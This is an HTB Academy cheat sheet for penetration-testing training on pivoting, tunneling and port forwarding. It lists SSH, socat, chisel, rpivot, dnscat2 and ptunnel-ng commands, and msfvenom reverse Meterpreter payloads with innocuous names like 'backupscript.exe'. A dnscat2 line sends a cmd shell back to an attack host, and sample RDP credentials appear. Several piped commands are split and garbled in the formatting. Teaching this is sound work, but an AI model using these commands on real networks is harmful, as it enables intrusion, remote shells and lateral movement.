{"title": "Pivoting, Tunneling, and Port Forwarding", "source": "htb-academy", "source_label": "HTB Academy", "path": "htb-academy/academy-pivoting-tunneling-and-port-forwarding", "html": "<h1 id=\"pivoting-tunneling-and-port-forwarding\">Pivoting, Tunneling, and Port Forwarding</h1>\n<h3 id=\"linux-based-command-that-displays-all-current-network-config\">Linux-based command that displays all current network configurations of a system.</h3>\n<pre><code class=\"language-bash\">ifconfig</code></pre>\n<h3 id=\"windows-based-command-that-displays-all-system-network-confi\">Windows-based command that displays all system network configurations.</h3>\n<pre><code class=\"language-bash\">ipconfig</code></pre>\n<h3 id=\"command-used-to-display-the-routing-table-for-all-ipv4-based\">Command used to display the routing table for all IPv4-based protocols.</h3>\n<pre><code class=\"language-bash\">netstat -r</code></pre>\n<h3 id=\"nmap-command-used-to-scan-a-target-for-open-ports-allowing-s\">Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</h3>\n<pre><code class=\"language-bash\">nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></pre>\n<h3 id=\"ssh-comand-used-to-create-an-ssh-tunnel-from-a-local-machine\">SSH comand used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.</h3>\n<pre><code class=\"language-bash\">ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></pre>\n<h3 id=\"grep-1234\">grep 1234`</h3>\n<pre><code class=\"language-bash\">`netstat -antp \\</code></pre>\n<h3 id=\"nmap-command-used-to-scan-a-host-through-a-connection-that-h\">Nmap command used to scan a host through a connection that has been made on local port 1234.</h3>\n<pre><code class=\"language-bash\">nmap -v -sV -p1234 localhost</code></pre>\n<h3 id=\"ssh-command-that-instructs-the-ssh-client-to-request-the-ssh\">SSH command that instructs the ssh client to request the SSH server forward all data via port 1234 to localhost:3306.</h3>\n<pre><code class=\"language-bash\">ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></pre>\n<h3 id=\"ssh-command-used-to-perform-a-dynamic-port-forward-on-port-9\">SSH command used to perform a dynamic port forward on port 9050 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</h3>\n<pre><code class=\"language-bash\">ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></pre>\n<h3 id=\"linux-based-command-used-to-display-the-last-4-lines-of-etcp\">Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.</h3>\n<pre><code class=\"language-bash\">tail -4 /etc/proxychains.conf</code></pre>\n<h3 id=\"used-to-send-traffic-generated-by-an-nmap-scan-through-proxy\">Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range 172.16.5.1-200 with increased verbosity (-v) disabling ping scan (-sn).</h3>\n<pre><code class=\"language-bash\">proxychains nmap -v -sn &lt;target-ip&gt;-200</code></pre>\n<h3 id=\"used-to-send-traffic-generated-by-an-nmap-scan-through-proxy\">Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (-v), disabling ping discover (-Pn), and using TCP connect scan type (-sT).</h3>\n<pre><code class=\"language-bash\">proxychains nmap -v -Pn -sT &lt;target-ip&gt;</code></pre>\n<h3 id=\"uses-proxychains-to-open-metasploit-and-send-all-generated-n\">Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</h3>\n<pre><code class=\"language-bash\">proxychains msfconsole</code></pre>\n<h3 id=\"metasploit-search-that-attempts-to-find-a-module-called-rdps\">Metasploit search that attempts to find a module called rdp_scanner.</h3>\n<pre><code class=\"language-bash\">msf6 &gt; search rdp_scanner</code></pre>\n<h3 id=\"used-to-connect-to-a-target-using-rdp-and-a-set-of-credentia\">Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</h3>\n<pre><code class=\"language-bash\">proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code></pre>\n<h3 id=\"uses-msfvenom-to-generate-a-windows-based-reverse-https-mete\">Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following lhost= on local port 8080 (LPORT=8080). Payload will take the form of an executable file called backupscript.exe.</h3>\n<pre><code class=\"language-bash\">msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></pre>\n<h3 id=\"used-to-select-the-multi-handler-exploit-module-in-metasploi\">Used to select the multi-handler exploit module in Metasploit.</h3>\n<pre><code class=\"language-bash\">msf6 &gt; use exploit/multi/handler</code></pre>\n<h3 id=\"uses-secure-copy-protocol-scp-to-transfer-the-file-backupscr\">Uses secure copy protocol (scp) to transfer the file backupscript.exe to the specified host and places it in the Ubuntu user&#x27;s home directory (:~/).</h3>\n<pre><code class=\"language-bash\">scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></pre>\n<h3 id=\"uses-python3-to-start-a-simple-http-server-listening-on-port\">Uses Python3 to start a simple HTTP server listening on port 8123. Can be used to retrieve files from a host.</h3>\n<pre><code class=\"language-bash\">python3 -m http.server 8123</code></pre>\n<h3 id=\"powershell-command-used-to-download-a-file-called-backupscri\">PowerShell command used to download a file called backupscript.exe from a webserver (172.16.5.129:8123) and then save the file to location specified after -OutFile.</h3>\n<pre><code class=\"language-powershell\">Invoke-WebRequest -Uri &quot;http://&lt;target-ip&gt;:8123/backupscript.exe&quot; -OutFile &quot;C:\\backupscript.exe&quot;</code></pre>\n<h3 id=\"ssh-command-used-to-create-a-reverse-ssh-tunnel-from-a-targe\">SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.</h3>\n<pre><code class=\"language-bash\">ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></pre>\n<h3 id=\"uses-msfveom-to-generate-a-linux-based-meterpreter-reverse-t\">Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after LHOST= on port 8080 (LPORT=8080). Payload takes the form of an executable elf file called backupjob.</h3>\n<pre><code class=\"language-bash\">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></pre>\n<h3 id=\"metasploit-command-that-runs-a-ping-sweep-module-against-the\">Metasploit command that runs a ping sweep module against the specified network segment (RHOSTS=172.16.5.0/23).</h3>\n<pre><code class=\"language-bash\">msf6&gt; run post/multi/gather/ping_sweep RHOSTS=&lt;subnet&gt;</code></pre>\n<h3 id=\"grep-bytes-from-done\">grep &quot;bytes from&quot; &amp;) ;done`</h3>\n<pre><code class=\"language-bash\">`for i in {1..254} ;do (ping -c 1 172.16.5.$i \\</code></pre>\n<h3 id=\"find-reply\">find &quot;Reply&quot;`</h3>\n<pre><code class=\"language-bash\">`for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \\</code></pre>\n<h3 id=\"172165-test-connection-count-1-comp-172155-quiet\">% {&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;}`</h3>\n<pre><code class=\"language-bash\">`1..254 \\</code></pre>\n<h3 id=\"metasploit-command-that-selects-the-socksproxy-auxiliary-mod\">Metasploit command that selects the socks_proxy auxiliary module.</h3>\n<pre><code class=\"language-bash\">msf6 &gt; use auxiliary/server/socks_proxy</code></pre>\n<h3 id=\"metasploit-command-that-lists-all-currently-running-jobs\">Metasploit command that lists all currently running jobs.</h3>\n<pre><code class=\"language-bash\">msf6 auxiliary(server/socks_proxy) &gt; jobs</code></pre>\n<h3 id=\"line-of-text-that-should-be-added-to-etcproxychainsconf-to-e\">Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</h3>\n<pre><code class=\"language-bash\">socks4 \t127.0.0.1 9050</code></pre>\n<h3 id=\"line-of-text-that-should-be-added-to-etcproxychainsconf-to-e\">Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5  proxy is used in combination with proxychains on the specified IP address and port.</h3>\n<pre><code class=\"language-bash\">Socks5 127.0.0.1 1080</code></pre>\n<h3 id=\"metasploit-command-used-to-select-the-autoroute-module\">Metasploit command used to select the autoroute module.</h3>\n<pre><code class=\"language-bash\">msf6 &gt; use post/multi/manage/autoroute</code></pre>\n<h3 id=\"meterpreter-command-used-to-display-the-features-of-the-port\">Meterpreter command used to display the features of the portfwd command.</h3>\n<pre><code class=\"language-bash\">meterpreter &gt; help portfwd</code></pre>\n<h3 id=\"meterpreter-based-portfwd-command-that-adds-a-forwarding-rul\">Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</h3>\n<pre><code class=\"language-bash\">meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></pre>\n<h3 id=\"uses-xfreerdp-to-connect-to-a-remote-host-through-localhost3\">Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</h3>\n<pre><code class=\"language-bash\">xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></pre>\n<h3 id=\"used-to-display-all-a-active-network-connections-with-associ\">Used to display all (-a) active network connections with associated process IDs. -t displays only TCP connections.-n displays only numerical addresses. -p displays process IDs associated with each displayed connection.</h3>\n<pre><code class=\"language-bash\">netstat -antp</code></pre>\n<h3 id=\"meterpreter-based-portfwd-command-that-adds-a-forwarding-rul\">Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port 1234 listening on the IP address of the Attack Host.</h3>\n<pre><code class=\"language-bash\">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></pre>\n<h3 id=\"meterpreter-based-command-used-to-run-the-selected-meteprete\">Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</h3>\n<pre><code class=\"language-bash\">meterpreter &gt; bg</code></pre>\n<h3 id=\"uses-socat-to-listen-on-port-8080-and-then-to-fork-when-the-\">Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</h3>\n<pre><code class=\"language-bash\">socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></pre>\n<h3 id=\"uses-socat-to-listen-on-port-8080-and-then-to-fork-when-the-\">Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</h3>\n<pre><code class=\"language-bash\">socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></pre>\n<h3 id=\"windows-based-command-that-uses-puttys-plinkexe-to-perform-s\">Windows-based command that uses PuTTY&#x27;s Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</h3>\n<pre><code class=\"language-bash\">plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></pre>\n<h3 id=\"uses-apt-get-to-install-the-tool-sshuttle\">Uses apt-get to install the tool sshuttle.</h3>\n<pre><code class=\"language-bash\">sudo apt-get install sshuttle</code></pre>\n<h3 id=\"runs-sshuttle-connects-to-the-target-host-and-creates-a-rout\">Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (172.16.5.0).</h3>\n<pre><code class=\"language-bash\">sudo sshuttle -r ubuntu@&lt;target-ip&gt; &lt;target-ip&gt; -v</code></pre>\n<h3 id=\"clones-the-rpivot-project-github-repository\">Clones the rpivot project GitHub repository.</h3>\n<pre><code class=\"language-bash\">sudo git clone https://github.com/klsecservices/rpivot.git</code></pre>\n<h3 id=\"uses-apt-get-to-install-python27\">Uses apt-get to install python2.7.</h3>\n<pre><code class=\"language-bash\">sudo apt-get install python2.7</code></pre>\n<h3 id=\"used-to-run-the-rpivot-server-serverpy-on-proxy-port-9050-se\">Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).</h3>\n<pre><code class=\"language-bash\">python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></pre>\n<h3 id=\"uses-secure-copy-protocol-to-transfer-an-entire-directory-an\">Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</h3>\n<pre><code class=\"language-bash\">scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></pre>\n<h3 id=\"used-to-run-the-rpivot-client-clientpy-to-connect-to-the-spe\">Used to run the rpivot client (client.py) to connect to the specified rpivot server on the appropriate port.</h3>\n<pre><code class=\"language-bash\">python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></pre>\n<h3 id=\"opens-firefox-with-proxychains-and-sends-the-web-request-thr\">Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</h3>\n<pre><code class=\"language-bash\">proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></pre>\n<h3 id=\"use-to-run-the-rpivot-client-to-connect-to-a-web-server-that\">Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</h3>\n<pre><code class=\"language-bash\">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></pre>\n<h3 id=\"windows-based-command-that-uses-netshexe-to-configure-a-port\">Windows-based command that uses netsh.exe to configure a portproxy rule called  v4tov4  that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</h3>\n<pre><code class=\"language-bash\">netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=&lt;target-ip&gt; connectport=3389 connectaddress=&lt;target-ip&gt;</code></pre>\n<h3 id=\"windows-based-command-used-to-view-the-configurations-of-a-p\">Windows-based command used to view the configurations of a portproxy rule called v4tov4.</h3>\n<pre><code class=\"language-bash\">netsh.exe interface portproxy show v4tov4</code></pre>\n<h3 id=\"clones-the-dnscat2-project-github-repository\">Clones the dnscat2 project GitHub repository.</h3>\n<pre><code class=\"language-bash\">git clone https://github.com/iagox86/dnscat2.git</code></pre>\n<h3 id=\"used-to-start-the-dnscat2rb-server-running-on-the-specified-\">Used to start the dnscat2.rb server running on the specified IP address, port (53) &amp; using the domain inlanefreight.local with the no-cache option enabled.</h3>\n<pre><code class=\"language-bash\">sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=&lt;domain&gt; --no-cache</code></pre>\n<h3 id=\"clones-the-dnscat2-powershell-project-github-repository\">Clones the dnscat2-powershell project Github repository.</h3>\n<pre><code class=\"language-bash\">git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></pre>\n<h3 id=\"powershell-command-used-to-import-the-dnscat2ps1-tool\">PowerShell command used to import the dnscat2.ps1 tool.</h3>\n<pre><code class=\"language-powershell\">Import-Module dnscat2.ps1</code></pre>\n<h3 id=\"powershell-command-used-to-connect-to-a-specified-dnscat2-se\">PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (-Exec cmd).</h3>\n<pre><code class=\"language-bash\">Start-Dnscat2 -DNSserver 10.10.14.18 -Domain &lt;domain&gt; -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></pre>\n<h3 id=\"used-to-list-dnscat2-options\">Used to list dnscat2 options.</h3>\n<pre><code class=\"language-bash\">dnscat2&gt; ?</code></pre>\n<h3 id=\"used-to-interact-with-an-established-dnscat2-session\">Used to interact with an established dnscat2 session.</h3>\n<pre><code class=\"language-bash\">dnscat2&gt; window -i 1</code></pre>\n<h3 id=\"used-to-start-a-chisel-server-in-verbose-mode-listening-on-p\">Used to start a chisel server in verbose mode listening on port 1234 using SOCKS version 5.</h3>\n<pre><code class=\"language-bash\">./chisel server -v -p 1234 --socks5</code></pre>\n<h3 id=\"used-to-connect-to-a-chisel-server-at-the-specified-ip-addre\">Used to connect to a chisel server at the specified IP address &amp; port using socks.</h3>\n<pre><code class=\"language-bash\">./chisel client -v &lt;target-ip&gt;:1234 socks</code></pre>\n<h3 id=\"clones-the-ptunnel-ng-project-github-repository\">Clones the ptunnel-ng project GitHub repository.</h3>\n<pre><code class=\"language-bash\">git clone https://github.com/utoni/ptunnel-ng.git</code></pre>\n<h3 id=\"used-to-run-the-autogensh-shell-script-that-will-build-the-n\">Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</h3>\n<pre><code class=\"language-bash\">sudo ./autogen.sh</code></pre>\n<h3 id=\"used-to-start-the-ptunnel-ng-server-on-the-specified-ip-addr\">Used to start the ptunnel-ng server on the specified IP address (-r) and corresponding port (-R22).</h3>\n<pre><code class=\"language-bash\">sudo ./ptunnel-ng -r10.129.202.64 -R22</code></pre>\n<h3 id=\"used-to-connect-to-a-specified-ptunnel-ng-server-through-loc\">Used to connect to a specified ptunnel-ng server through local port 2222 (-l2222).</h3>\n<pre><code class=\"language-bash\">sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></pre>\n<h3 id=\"ssh-command-used-to-connect-to-an-ssh-server-through-a-local\">SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</h3>\n<pre><code class=\"language-bash\">ssh -p2222 -lubuntu 127.0.0.1</code></pre>\n<h3 id=\"windows-based-command-used-to-register-the-socksoverrdp-plug\">Windows-based command used to register the SocksOverRDP-PLugin.dll.</h3>\n<pre><code class=\"language-bash\">regsvr32.exe SocksOverRDP-Plugin.dll</code></pre>\n<h3 id=\"findstr-1080\">findstr 1080`</h3>\n<pre><code class=\"language-bash\">`netstat -antb \\</code></pre>", "excerpt": "Pivoting, Tunneling, and Port Forwarding Linux-based command that displays all current network configurations of a system. ifconfig Windows-based command that displays all system network configuration…", "tags": ["htb-academy", "cheatsheet"]}